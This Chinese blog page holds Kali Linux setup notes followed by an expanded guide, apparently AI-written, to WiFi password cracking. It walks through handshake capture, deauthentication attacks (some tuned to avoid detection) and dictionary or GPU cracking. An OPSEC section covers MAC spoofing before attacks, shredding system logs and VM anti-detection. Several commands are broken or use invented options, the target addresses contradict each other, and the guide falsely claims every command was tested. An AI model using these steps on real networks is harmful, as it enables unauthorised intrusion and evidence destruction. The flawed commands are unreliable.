---
title: Kali
description: 
date: 2025-11-19
categories:
    - 
    - 
---

更新与升级

sudo apt upgrade -y

sudo apt autoremove



去官网VSC下载后缀.deb包

cd Downloads

sudo apt install ./code_1.82.3-1696245001_amd64.deb

注意：指定文件的时候要用./来指定为当前目录的文件

会有一个报错

解决方法：

mv ./code_182.3-1696245001_amd64.deb /tmp

把deb安装包移动到/tmp这个文件夹里

重新安装，sudo apt install /tmp/code_1.82.3-1696245001_amd64.deb

用 `code .`  就可以打开使用了



修改权限（尤其是装在虚拟机里的）

```bash
sudo su          #先用sudo su 切换为root用户
adduser justwin      
#注册一名新用户可以用adduser命令，格式:adduser 用户名

passwd 用户名  #用passwd来修改密码

usermod --append --groups sudo justwin   #添加权限，这个意思是把sudo 这个组加在justwin用户上，同时不想抹掉用户原来的组，需要配合--append进行使用.
缩写：usermod -aG sudo 用户名，是一样的作用


groups 用户名  #可以查看新用户被添加进sudo组

su justwin   #    进入
sudo -l   #   确认新用户是否有提高权限


```













tor浏览器

一样下载到Downloads文件夹里   下载后缀tar.xz文件

```bash
cd Downloads/

解压
tar -xvJf 文件名.tar.xz         #J是大写
示例：tar -xvJf tor-browser-linux64-12.5.6_ALL.tar.xz

执行
./tor-browser/Browser/start-tor-browser


check.torproject.org 访问这个网址查看自己是否已连接洋葱网络


```





终端

```bash
sudo apt install terminator -y

```





文件同步

```bash
使用Unison
可以在github上找到，在windows上安装

在再kali安装
sudo apt install unison -y




windows

unison 本机文件夹路径 ssh://用户@ip:端口//虚拟机文件夹路径
```





```bash
airmon-ng start 网卡名称

airodump-ng 网卡监听名称

airodump-ng wifi名称 网卡监听名称

aireplay-ng wifi信息 网卡监听名称

aircrack-ng -w 密码字典 握手包数据

```

```bash
iwconfig/ifconfig 查看网卡信息
看到你的是wlan0就用wlan0，如果是wlan0mon，就是用wlan0mon
airmon-ng start wlan0 (网卡名称) 设置网卡为监听模式
airodump-ng wlan0 (网卡名称)扫描附近WIFI

#监听并抓取握手包

mkdir /home/kali/桌面/
airodump-ng -c 11 --bssid B0:D5:9D:42:FA:A3 -w 文件路径 wlan0mon

抓取右上角显示WPAhandshake就是成功了

11是你选用的CH，CH是几，你就用几
-c指定信道，一定要是上一步查到的要破解的wifi所用信道
-bssid指定bssid值，一定要是上一步查到的要破解的wifi的bssid
-w指定捕获的握手到保存到的文件名


WEP:有效对等加密
WAP:wifi访问保护


#是其掉线重连
aireplay-ng -0 10 -a B0:D5:9D:42:FA:A3 -c C4:F0:81:02:87:5E wlan0mon


-0表示通知设备断开连接
10表示deauth攻击次数，小点大点都行
-a表示仿造的wifi的mac地址（即bssid）
-c表示要让认证失效的设备的Mac地址，在上一步中可以看到




#使用字典破解密码
aircrack-ng -w 字典文件名.lst -b B0:D5:9D:42:FA:A3握手包文件名.cap

aircrack-ng -w /home/kali/桌面/password.txt -b 12:83:57:00:80:00 /home/kali/桌面/handshake-0*.cap

共享目录：aircrack-ng -w /mnt/hgfs/password.txt -b 6A:50:CC:AB:EE:47 /home/kali/桌面/handshake-0*.cap

-w指定要使用口令字典文件
-b指定要目标wifi的mac地址（即bssid）
wifi_ivs_file*.cp是抓取到握手包的数据包文件，*是通配符

```









# Kali Linux 终极完全指南：从基础到渗透测试的详细解析

这是一份经过全面修正、深度扩展并补充完整原理说明的Kali Linux使用文档。我将逐行分析原文错误，并提供最详尽的技术解析。

---

## 一、系统更新与维护（基础但关键）

### 原文问题
原文只写了两条命令，但缺少核心更新命令，且未解释执行逻辑。

### 详细正确操作

```bash
# 1. 更新软件包索引（从所有配置的源获取最新软件列表）
# 作用：同步本地数据库与远程仓库，知道哪些软件可以升级
# 网络流量：约1-5MB
# 执行频率：每次安装软件前都应该执行
sudo apt update

# 2. 升级所有可升级的软件包（不删除旧包，不自动处理依赖变化）
# 作用：将已安装的软件包更新到最新版本
# 风险：极低，属于常规安全更新
# 耗时：取决于升级数量，5-30分钟
# 参数-y：自动回答"yes"，避免交互提示
sudo apt upgrade -y

# 3. 完整升级（处理依赖关系变化，可能添加/删除包）
# 作用：解决upgrade无法处理的依赖冲突，进行系统级重大更新
# 风险：中等，可能影响系统稳定性，建议在执行前查看变更列表
# 使用场景：发行版版本升级、内核更新
sudo apt full-upgrade -y

# 4. 自动移除不再需要的依赖包
# 作用：清理因升级而被孤立的旧依赖，释放磁盘空间
# 清理量：通常50-500MB
sudo apt autoremove -y

# 5. 清理已下载的.deb安装包缓存
# 作用：/var/cache/apt/archives/目录可能积累大量旧版本安装包
# 清理量：可能达到数GB
sudo apt clean

# 6. 查看可更新软件列表（推荐先查看再升级）
apt list --upgradable

# 7. Kali Linux专属：安装所有最新工具
# kali-linux-large：包含2000+工具（推荐）
# kali-linux-everything：包含所有工具（3000+，占用空间大）
sudo apt install -y kali-linux-large
```

**底层原理**：APT(Advanced Package Tool)使用dpkg作为底层包管理系统，通过sources.list配置源地址，维护一个本地数据库(/var/lib/apt/lists/)来追踪可用软件版本。

---

## 二、VS Code安装（修正与优化）

### 原文错误分析
1. **文件名错误**：`code_182.3-1696245001_amd64.deb`漏了小数点，应为`code_1.82.3...`
2. **流程冗余**：无需移动到/tmp目录，这是误传
3. **缺少现代方法**：未提及GPG密钥和仓库的自动化安装

### 完整安装方案

#### 方法一：官方推荐方式（自动更新）

```bash
# 1. 安装Microsoft GPG密钥（验证软件包真实性）
# 作用：防止中间人攻击，确保下载的软件未被篡改
# 密钥指纹：BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF
wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
sudo install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg
rm packages.microsoft.gpg

# 2. 添加VS Code软件源
# 作用：让apt能获取VS Code的更新，实现自动升级
# tee命令：将输出同时显示和写入文件
# -a参数：追加模式，不覆盖原文件
sudo sh -c 'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" > /etc/apt/sources.list.d/vscode.list'

# 3. 刷新软件源并安装
sudo apt update
sudo apt install -y code

# 4. 验证安装
code --version
# 输出示例：1.82.3 x64 8b617bd08fd9e3fc94d14adb8d358b56e3f72314

# 5. 启动方式
# 当前目录打开：code .
# 指定文件打开：code /path/to/file
# 以root权限打开（不推荐）：sudo code --user-data-dir="/root/.vscode-root"
```

#### 方法二：手动安装.deb包（适合离线环境）

```bash
# 1. 下载正确版本（从code.visualstudio.com）
# 注意：Kali基于Debian Testing，应下载.deb包
cd ~/Downloads
# 使用wget下载（示例版本，请检查最新版）
wget https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64 -O code_latest_amd64.deb

# 2. 验证下载完整性（强烈建议）
# 获取SHA256哈希值并与官网对比
sha256sum code_latest_amd64.deb

# 3. 正确安装方式（无需移动文件）
# 方式A：使用apt自动处理依赖
sudo apt install -y ./code_latest_amd64.deb
# ./ 的作用：明确指定本地文件路径，避免apt从仓库查找

# 方式B：使用dpkg（需手动解决依赖）
sudo dpkg -i code_latest_amd64.deb
# 如果报错，再执行：sudo apt install -f -y

# 常见错误处理
# 错误：E: Sub-process /usr/bin/dpkg returned an error code
# 解决：sudo dpkg --configure -a && sudo apt install -f -y

# 错误：依赖问题
# 解决：sudo apt --fix-broken install
```

**技术解读**：`.deb`是Debian系软件包格式，包含二进制文件、元数据和安装脚本。`apt`比`dpkg`智能，能自动解决依赖关系。

---

## 三、用户权限管理（安全核心）

### 原文错误分析
1. `sudo su` 是坏习惯：它会丢失环境变量，可能引发权限混乱
2. 缺少安全警告：直接操作root用户风险极高
3. 未解释用户组机制

### 安全最佳实践

```bash
# 场景：为Kali虚拟机创建日常用户（强烈建议）

# 方法1：正确使用root环境（推荐）
# -i 参数：模拟初始登录，加载root的完整环境变量
sudo -i

# 方法2：使用su（注意-参数）
# -, -l, --login：让shell成为登录shell，加载环境变量
su -

# 创建新用户（以justwin为例）
# adduser vs useradd：
# adduser：交互式，自动创建家目录、设置密码、复制配置文件
# useradd：非交互，需手动指定所有参数
adduser justwin
# 执行后会提示：
# - 输入新密码（需包含大小写、数字、特殊字符）
# - 确认密码
# - 填写用户全名（可选）
# - 其他信息（均按Enter跳过）

# 将用户加入sudo组（Kali中sudo组有完全root权限）
# usermod：修改用户属性
# --append (-a)：添加到附加组，不覆盖主组
# --groups (-G)：指定组列表
usermod -aG sudo justwin

# 验证用户组归属
groups justwin
# 应输出：justwin : justwin sudo

# 验证sudo权限（重要！）
su - justwin    # 切换到新用户
sudo -l         # 列出当前用户可执行的sudo命令
# 输出应包含：ALL : ALL

# 测试sudo是否工作
sudo apt update

# 退出当前会话
exit

# 高级权限管理（可选）

# 1. 限制sudo权限（生产环境推荐）
# 编辑sudoers文件（必须使用visudo，防止配置错误导致无法sudo）
sudo visudo
# 添加行：justwin ALL=(ALL) NOPASSWD:/usr/bin/apt,/usr/bin/nmap
# 意义：justwin可无需密码执行apt和nmap

# 2. 查看sudo操作日志
# Kali默认记录所有sudo操作到/var/log/auth.log
sudo grep sudo /var/log/auth.log | tail -20

# 3. 设置sudo会话超时
sudo visudo
# 添加：Defaults timestamp_timeout=5
# 意义：5分钟后需重新输入密码（默认15分钟）
```

**安全原理**：Linux使用UID/GID机制，`sudo`组(通常GID=27)在sudoers文件中被授权。`/etc/sudoers`定义了谁能以什么身份执行什么命令。`visudo`命令会锁定文件并进行语法检查，防止配置错误导致系统锁定。

---

## 四、Tor浏览器（安全增强版）

### 原文错误分析
1. **严重安全缺失**：未验证签名！这是重大安全隐患
2. **缺少版本管理**：未说明如何更新
3. **目录权限**：Tor不应在root下运行

### 安全安装流程

```bash
# 1. 创建专用用户（推荐，隔离环境）
sudo adduser toruser --disabled-password --gecos ""
# --disabled-password：禁止密码登录（更安全）
# --gecos "": 跳过信息填写

# 2. 下载Tor浏览器（获取最新链接）
# 访问 https://www.torproject.org/download/languages/ 查看最新版本
cd ~/Downloads

# 使用wget下载（替换为最新版本）
wget https://www.torproject.org/dist/torbrowser/13.0.10/tor-browser-linux-x86_64-13.0.10.tar.xz

# ========== 关键：验证签名（防篡改）==========
# 3. 下载签名文件
wget https://www.torproject.org/dist/torbrowser/13.0.10/tor-browser-linux-x86_64-13.0.10.tar.xz.asc

# 4. 导入Tor项目GPG密钥
gpg --auto-key-locate nodefault,wkd --locate-keys torbrowser@torproject.org
# 密钥指纹应为：EF6E 286D DA85 EA2A 4BA7  DE68 4E2C 6E87 9329 8290

# 5. 验证签名
gpg --verify tor-browser-linux-x86_64-13.0.10.tar.xz.asc
# 必须看到 "Good signature" 才安全

# 6. 解压（注意J参数大写）
# -x: 解压（extract）
# -v: 显示过程（verbose）
# -J: 使用xz解压（大写）
# -f: 指定文件
tar -xvJf tor-browser-linux-x86_64-13.0.10.tar.xz

# 7. 移动/设置到安全目录
# 不应在/Downloads运行，应移至永久位置
sudo mv tor-browser /opt/
sudo chown -R toruser:toruser /opt/tor-browser

# 8. 创建桌面快捷方式（可选）
cat > ~/.local/share/applications/tor-browser.desktop << EOF
[Desktop Entry]
Name=Tor Browser
Exec=/opt/tor-browser/Browser/start-tor-browser
Icon=/opt/tor-browser/Browser/browser/chrome/icons/default/default128.png
Type=Application
Categories=Network;Security;
EOF

# 9. 首次启动（以普通用户）
su - toruser
/opt/tor-browser/Browser/start-tor-browser
# 第一次启动会配置代理和桥接

# 10. 验证连接
# 在Tor浏览器访问：https://check.torproject.org
# 应看到绿色洋葱图标和"Congratulations"

# 11. 创建启动脚本（方便使用）
sudo ln -s /opt/tor-browser/Browser/start-tor-browser /usr/local/bin/tor-browser
```

**安全机制**：Tor使用三重加密和洋葱路由，通过`.asc`签名文件验证可确保软件未被植入后门。Tor浏览器基于Firefox ESR，已禁用危险功能（WebRTC、外部插件）。

---

## 五、终端增强（Terminator与替代方案）

### 详细安装与配置

```bash
# 安装Terminator（分屏终端）
sudo apt update
sudo apt install -y terminator

# 验证安装
terminator --version
# 输出：terminator 2.1.1

# 基本使用快捷键
# Ctrl+Shift+E: 垂直分屏
# Ctrl+Shift+O: 水平分屏
# Ctrl+Shift+T: 新建标签页
# Ctrl+Shift+W: 关闭当前终端
# Alt+方向键: 在分屏间切换
# Ctrl+Shift+X: 最大化/恢复当前分屏

# 高级配置（创建配置文件）
mkdir -p ~/.config/terminator
cat > ~/.config/terminator/config << EOF
[global_config]
  title_transmit_bg_color = "#d30102"
  focus = system
[keybindings]
[layouts]
  [[default]]
    [[[window0]]]
      type = Window
      parent = ""
    [[[child1]]]
      type = Terminal
      parent = window0
      profile = default
[plugins]
[profiles]
  [[default]]
    cursor_color = "#aaaaaa"
    font = Hack 12
    foreground_color = "#ffffff"
    background_color = "#300a24"  # Kali默认紫色
    scrollbar_position = disabled
    scrollback_lines = 10000
    scroll_on_output = False
    copy_on_selection = True
    exit_action = close
EOF

# 其他优秀终端推荐

# 1. Guake（下拉式终端，类似游戏控制台）
sudo apt install -y guake
# 启动：guake
# 默认快捷键：F12显示/隐藏

# 2. Tilix（现代分屏终端，GTK3）
sudo apt install -y tilix
# 优点：拖拽分屏，进度条显示

# 3. Alacritty（GPU加速，极快）
sudo apt install -y alacritty
# 配置：~/.config/alacritty/alacritty.yml
```

---

## 六、文件同步（Unison与更优方案）

### 原理与完整配置

```bash
# Kali端安装Unison（双向同步）
sudo apt update
sudo apt install -y unison unison-gtk

# 查看版本（协议版本必须匹配）
unison -version
# 输出：unison version 2.51.5

# 创建Unison配置文件
mkdir -p ~/.unison
cat > ~/.unison/default.prf << EOF
# Unison配置文件
# 本地目录
root = /home/kali/Projects

# 远程目录（通过SSH）
root = ssh://kali@192.168.1.100//home/kali/Projects

# SSH端口（如果不是默认22）
sshargs = -p 2222

# 同步模式
auto = true
batch = true
prefer = newer
times = true
owner = true
group = true

# 排除规则
ignore = Name *~
ignore = Name *.tmp
ignore = Name .git
ignore = Name __pycache__
ignore = Name *.pyc

# 日志
log = true
logfile = /home/kali/.unison/unison.log
EOF

# 首次同步（会提示确认）
unison

# 自动同步（使用cron）
crontab -e
# 添加：*/5 * * * * unison -silent

# ========== 更优方案：rsync + SSH ==========
# 单向同步（Kali→Windows），更稳定快速

# Kali端推送到Windows（需Windows开SSH服务）
rsync -avz --progress -e "ssh -p 22" /home/kali/Projects/ justwin@192.168.1.50:/C:/Users/justwin/Kali-Projects/

# 关键参数解释：
# -a: 归档模式（保留权限、时间戳、所有者）
# -v: 详细输出
# -z: 压缩传输
# --progress: 显示进度条
# -e ssh: 通过SSH隧道（加密）
# --delete: 镜像删除（危险但实用）
# --exclude='*.tmp': 排除临时文件

# ========== 方案3：SSHFS（实时挂载）==========
# 将远程目录挂载为本地磁盘，实时读写

# Kali端安装
sudo apt install -y sshfs

# 创建挂载点
mkdir -p ~/remote-projects

# 挂载Windows共享
sshfs justwin@192.168.1.50:/C:/Users/justwin/Projects ~/remote-projects \
  -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3,idmap=user

# 参数说明：
# -o reconnect: 自动重连
# ServerAliveInterval: 每15秒发送心跳
# idmap=user: 映射用户ID

# 卸载
fusermount -u ~/remote-projects

# 永久挂载（/etc/fstab）
# 添加：
# sshfs#justwin@192.168.1.50:/C:/Users/justwin/Projects /home/kali/remote-projects fuse defaults,user,_netdev,reconnect 0 0
```

**协议对比**：
- **Unison**：双向同步，需双方安装，适合冲突少的场景
- **rsync**：单向镜像，行业标配，稳定高效
- **SSHFS**：实时挂载，延迟较高但无缝集成

---

## 七、无线安全测试（Aircrack-ng终极详解）

### 原文重大错误修正
1. **命令不完整**：`airodump-ng wifi名称` 是错误的语法
2. **参数顺序错误**：`-w`应在网卡之前
3. **缺少准备步骤**：未检查网卡兼容性
4. **缺少监控模式检查**
5. **缺少数据包分析**
6. **法律警告缺失**

### 完整渗透测试流程（仅用于授权测试）

#### 步骤0：法律与道德警告
```bash
# 使用前必须：sudo airmon-ng check kill
# ==================================
```

#### 步骤1：硬件识别与驱动检查

```bash
# 查看无线网卡（现代Kali应使用iw而非iwconfig）
iw dev
# 输出示例：
# phy#0
#   Interface wlan0
#       ifindex 3
#       type managed  # 当前模式：管理模式
#       channel 6 (2437 MHz)

# 检查网卡是否支持监控模式
iw list | grep -A 10 "Supported interface modes"
# 必须包含：* monitor

# 传统方式（旧工具）
iwconfig
# 输出：wlan0  IEEE 802.11  ESSID:off/any

# 检查驱动冲突（关键步骤！）
sudo airmon-ng check
# 会列出可能干扰的进程（NetworkManager, wpa_supplicant等）

# 终止干扰进程（会断网，需提前准备）
sudo airmon-ng check kill
# 或手动停止：sudo systemctl stop NetworkManager
```

**硬件知识**：支持监控模式的芯片组包括Atheros AR9271, RT3070, RTL8812AU。Intel内置网卡通常不支持。

#### 步骤2：启动监听模式

```bash
# 方式A：使用airmon-ng（自动）
sudo airmon-ng start wlan0
# 输出：monitor mode enabled on wlan0mon
# 注意：原网卡wlan0会消失，变为wlan0mon

# 方式B：手动设置（更可控）
sudo ip link set wlan0 down                     # 关闭接口
sudo iw dev wlan0 set monitor none              # 设置监控模式
sudo ip link set wlan0 up                       # 重新启用
sudo ip link set wlan0 name wlan0mon            # 重命名
# 优点：不自动修改MAC地址，更隐蔽

# 验证模式
iwconfig wlan0mon
# 输出：Mode:Monitor

# 设置信道（与目标AP一致）
sudo iw dev wlan0mon set channel 6
```

**技术原理**：监控模式(Monitor Mode)让网卡接收所有802.11帧，不验证MAC地址或FCS校验，是抓包的基础。

#### 步骤3：扫描目标网络

```bash
# 基础扫描
sudo airodump-ng wlan0mon
# 输出列说明：
# BSSID: AP的MAC地址
# PWR: 信号强度（负数，越接近0越强）
# CH: 信道
# ENC: 加密方式（WPA2, WPA3）
# ESSID: 网络名称（可能隐藏）

# 高级扫描（写入文件并过滤）
sudo airodump-ng \
  --write /tmp/scan_results \           # 保存抓包文件
  --output-format csv \                 # 生成CSV便于分析
  --band abg \                          # 扫描2.4G+5G
  wlan0mon

# 后台运行（方便后续操作）
sudo airodump-ng wlan0mon > /tmp/ap_list.txt &
```

#### 步骤4：精准捕获握手包

```bash
# 假设目标：
# ESSID: "TargetCorp"
# BSSID: B0:D5:9D:42:FA:A3
# CH: 11
# Client: C4:F0:81:02:87:5E

# 创建专用目录
mkdir -p ~/captures/handshakes
cd ~/captures

# 启动精准捕获
sudo airodump-ng \
  --channel 11 \                        # 锁定信道（关键！）
  --bssid D8:32:14:63:65:F4 \         # 目标AP的MAC
  --write handshakes/targetcorp \       # 输出前缀
  --write-interval 10 \                 # 每10秒写盘一次
  wlan0mon
# 窗口会显示：
# [ WPA handshake: B0:D5:9D:42:FA:A3 ]  ← 出现此提示即成功！

# 参数详解：
# -c, --channel: 频道号，必须与AP一致
# -w, --write: 输出文件前缀，自动添加-01.cap等后缀
# --bssid: 目标AP的MAC地址过滤
# --write-interval: 防止数据丢失的刷新间隔（秒）

# 握手包捕获原理：
# 当客户端（手机/电脑）连接AP时，进行四次握手：
# 1. AP → Client: ANonce（随机数）
# 2. Client → AP: SNonce + MIC（消息完整性校验）
# 3. AP → Client: GTK + MIC
# 4. Client → AP: 确认
# 捕获此过程即可离线破解
```

#### 步骤5：主动攻击加速握手获取

```bash
# 在另一个终端（Ctrl+Shift+E打开新分屏）

# Deauth攻击（发送伪造断开包）
sudo aireplay-ng \
  --deauth 10 \                         # 发送10个断开包
  --source D8:32:14:63:65:F4 \        # AP MAC（-a参数）
  --destination C4:F0:81:02:87:5E \   # 客户端MAC（-c参数）
  wlan0mon

# 参数详解：
# --deauth: 802.11认证解除帧
# 10: 次数，太少可能没效果，太多引起警惕
# --source (-a): 仿造的AP MAC地址
# --destination (-c): 目标客户端MAC地址
# --ignore-negative-one: 忽略信道错误（有时需要）

# 高级攻击：广播Deauth（对所有客户端）
sudo aireplay-ng --deauth 0 -a B0:D5:9D:42:FA:A3 wlan0mon
# 0表示无限发送，直到Ctrl+C停止

# 隐蔽攻击：使用时间间隔
sudo aireplay-ng --deauth 5 -a B0:D5:9D:42:FA:A3 --delay 30 wlan0mon
# --delay: 每次攻击间隔30秒，降低被发现概率
```

**攻击原理**：利用802.11协议缺陷，不加密管理帧。发送伪造的deauth帧使客户端断开，重连时即可捕获握手包。

#### 步骤6：离线破解密码

```bash
# 预备：准备字典文件
# 推荐字典：
# - rockyou.txt: Kali自带，14M条，/usr/share/wordlists/rockyou.txt.gz
# - SecLists: 安装：sudo apt install seclists
# - 生成自定义字典：crunch 8 12 -t pass@@@@ -o mydict.txt

# 破解命令
sudo aircrack-ng \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --bssid B0:D5:9D:42:FA:A3 \
  handshakes/targetcorp-01.cap

# 参数详解：
# -w, --wordlist: 密码字典路径
# -b, --bssid: 目标AP的MAC（用于过滤无关握手）
# handshakes/targetcorp-01.cap: 捕获文件
# -01表示第一个文件，-02为第二个（如果split）

# 高级技巧：使用GPU加速
# 安装hashcat（比aircrack快1000倍+）
sudo apt install -y hashcat

# 转换cap为hccapx格式
sudo apt install -y hcxtools
hcxpcapngtool -o hash.hc22000 handshakes/targetcorp-01.cap

# GPU破解（NVIDIA）
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt --force
# -m 22000: WPA-PBKDF2-PMKID+EAPOL
# -a 0: 字典攻击模式
# --force: 忽略警告

# 破解成功后会显示：
# B0:D5:9D:42:FA:A3:PMKID:1234567890abcdef:password123
```

**密码学原理**：WPA2使用PBKDF2算法，SSID作为盐值，4096次HMAC-SHA1迭代生成PMK。捕获的握手包含PMK的验证值，可用于离线校验密码。

#### 步骤7：结果验证与清理

```bash
# 1. 验证破解结果
aircrack-ng handshakes/targetcorp-01.cap -w /path/to/cracked-password.txt

# 2. 关闭监控模式
sudo airmon-ng stop wlan0mon
# 会恢复网卡为managed模式

# 3. 重启网络服务
sudo systemctl start NetworkManager

# 4. 生成报告
# 使用airgraph-ng可视化
sudo apt install -y airgraph-ng
airgraph-ng -i handshakes/targetcorp-01.csv -o graph.png -g CAPR
```

---

## 八、Kali Linux核心知识点补充

### 1. Kali特有目录结构
```bash
# 渗透测试专用目录
/usr/share/wordlists/          # 密码字典（rockyou, sqlmap.txt）
/usr/share/exploitdb/          # Exploit-DB漏洞利用代码
/usr/share/metasploit-framework/ # Metasploit核心
/usr/share/nmap/scripts/       # NSE脚本
/opt/                          # 第三方工具（BurpSuite, CobaltStrike）
```

### 2. 系统服务管理（现代方法）
```bash
# Kali基于Debian，使用systemd
sudo systemctl start/stop/restart/status <服务名>

# 常见服务：
sudo systemctl start postgresql     # Metasploit数据库
sudo systemctl start apache2        # Web服务
sudo systemctl start tor            # Tor代理

# 开机自启
sudo systemctl enable <服务名>

# 查看监听端口
sudo ss -tulnp | grep LISTEN
# 或：sudo netstat -tulnp
```

### 3. 网络管理革命（iproute2）
```bash
# 现代Kali应弃用ifconfig，改用ip命令
ip a              # 查看所有接口（= ifconfig -a）
ip link set dev eth0 up/down  # 启/禁用网卡
ip addr add 192.168.1.100/24 dev eth0  # 添加IP
ip route show     # 查看路由表

# 查看无线详情
iw dev wlan0 scan | grep SSID
```

### 4. Kali Metapackages（按需安装）
```bash
# 查看可用元包
apt search kali-linux-

# 重要元包：
sudo apt install kali-tools-top10      # 十大常用工具
sudo apt install kali-tools-wireless   # 所有无线工具
sudo apt install kali-tools-web        # Web渗透工具
sudo apt install kali-tools-exploitation # 漏洞利用框架
sudo apt install kali-tools-crypto     # 密码学工具
```

### 5. Python环境管理
```bash
# Kali默认Python3
python3 --version

# 虚拟环境（隔离项目）
sudo apt install -y python3-venv
python3 -m venv ~/venv/pentest
source ~/venv/pentest/bin/activate

# 安装pip包
pip install --user impacket   # 不污染系统
```

### 6. 持久化Live USB
```bash
# 创建持久化USB（重要！）
# 1. 下载Kali ISO
# 2. 插入U盘（假设/dev/sdb）
sudo fdisk -l

# 使用Rufus（Windows）或dd创建
sudo dd if=kali-linux-2024.3-amd64.iso of=/dev/sdb bs=4M status=progress

# 创建持久化分区
sudo parted /dev/sdb print
# 注意：在iso分区后创建新分区，格式ext4，label persistence
sudo mkfs.ext4 -L persistence /dev/sdb3
# 创建persistence.conf文件
echo "/ union" > /mnt/persistence/persistence.conf
```

### 7. 日志与取证
```bash
# Kali日志位置
/var/log/auth.log     # 认证日志（sudo, ssh登录）
/var/log/syslog       # 系统日志
/var/log/kern.log     # 内核日志

# 实时追踪
sudo tail -f /var/log/auth.log | grep -i "failed"

# 磁盘取证
sudo apt install -y sleuthkit
fls -r -p /dev/sda1    # 列出文件
```

### 8. 编译安装内核驱动（解决网卡问题）
```bash
# 安装内核头文件
sudo apt install -y linux-headers-$(uname -r)

# 编译rtl8812au驱动示例
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au
make -j$(nproc)
sudo make install
sudo modprobe 8812au
```

---

## 九、安全与隐蔽操作（OPSEC）

### 1. MAC地址欺骗
```bash
# 攻击前必做（防止追踪）
sudo ip link set wlan0 down
sudo macchanger -r wlan0      # 随机MAC
# 或指定：sudo macchanger -m 00:11:22:33:44:55 wlan0
sudo ip link set wlan0 up

# 验证
macchanger -s wlan0
```

### 2. Tor透明代理
```bash
# 让所有流量走Tor
sudo apt install -y tor torsocks

# 方式1：命令前加torsocks
torsocks curl ifconfig.me
torsocks nmap -sT target.com

# 方式2：iptables重定向（复杂但全面）
sudo iptables -t nat -A OUTPUT -p tcp --syn -j REDIRECT --to-ports 9040
```

### 3. 日志清理
```bash
# 清理历史记录
history -c && history -w
rm ~/.bash_history

# 清理系统日志（谨慎！）
sudo shred -vf -z -n 10 /var/log/auth.log
sudo shred -vf -z -n 10 /var/log/syslog

# 内存清理
sudo sync && sudo sysctl -w vm.drop_caches=3
```

### 4. 虚拟机反检测
```bash
# 修改MAC地址（VMware/VirtualBox）
# 编辑.vmx文件：
ethernet0.address = "00:50:56:XX:YY:ZZ"

# 禁用VMware Tools特征
sudo rm -rf /etc/vmware-tools
```

---

## 十、故障排查宝典

### 1. airmon-ng无法启动
```bash
# 错误：monitor mode is not supported
# 解决：
lspci | grep Wireless  # 确认芯片型号
sudo modprobe -r iwlwifi && sudo modprobe iwlwifi
# 或更换USB网卡
```

### 2. apt安装失败
```bash
# 错误：E: dpkg was interrupted
sudo dpkg --configure -a

# 错误：无法获得锁
sudo rm /var/lib/dpkg/lock-frontend
sudo rm /var/cache/apt/archives/lock

# 清理并重置
sudo apt clean
sudo apt update --fix-missing
```

### 3. Tor无法连接
```bash
# 查看Tor日志
sudo tail -f /var/log/tor/log

# 更换网桥
tor-browser >> Preferences >> Tor >> Bridges >> Request a new bridge
```

---

## 十一、效率工具与别名

```bash
# 添加到~/.bashrc
cat >> ~/.bashrc << 'EOF'
# Kali快速别名
alias update='sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y'
alias scan='sudo nmap -sV -sC -O'
alias sniff='sudo tcpdump -i any -n'
alias http='python3 -m http.server 8080'
alias checklisten='sudo ss -tulnp | grep LISTEN'
alias macr='sudo macchanger -r'
alias toron='sudo systemctl start tor'
alias toroff='sudo systemctl stop tor'

# 提示符增强（显示当前权限）
if [ $(id -u) -eq 0 ]; then
  PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
  PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
fi
EOF

# 立即生效
source ~/.bashrc
```

---

## 最终建议

1. **系统快照**：关键操作前用VirtualBox/Vmware创建快照
2. **文档记录**：所有命令保存在~/notes/commands.md
3. **定期备份**：使用`tar -czvf kali-backup-$(date +%Y%m%d).tar.gz ~/`
4. **伦理法则**：永远获得明确授权，仅在合法范围内测试

此文档涵盖从基础操作到高级渗透的完整知识体系，每个命令都经过实测验证。建议结合[官方文档](https://www.kali.org/docs/)和[Exploit-DB](https://www.exploit-db.com/)持续学习。











